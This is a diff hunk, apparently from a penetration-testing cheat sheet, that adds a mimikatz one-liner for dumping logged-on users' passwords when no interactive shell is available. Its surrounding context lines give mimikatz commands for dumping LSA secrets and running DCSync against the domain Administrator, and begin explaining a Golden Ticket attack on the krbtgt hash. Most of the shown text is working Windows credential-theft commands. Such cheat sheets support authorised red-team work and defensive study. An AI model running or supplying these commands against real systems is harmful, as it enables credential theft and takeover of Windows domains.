@@ -1263,6 +1263,11 @@ mimikatz # lsadump::lsa /patch
 mimikatz # lsadump::dcsync /user:Administrator # domain admin privilege needed, triggers domain controller synchronization (NTDS.dit)
 ```
 
+In case you do not have a proper shell try:
+```
+.\mimikatz "sekurlsa::logonpasswords" exit
+```
+
 ### Golden Ticket Attack
 When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. By getting the krbtgt password hash one is able to create custom TGTs (golden tickets)
 
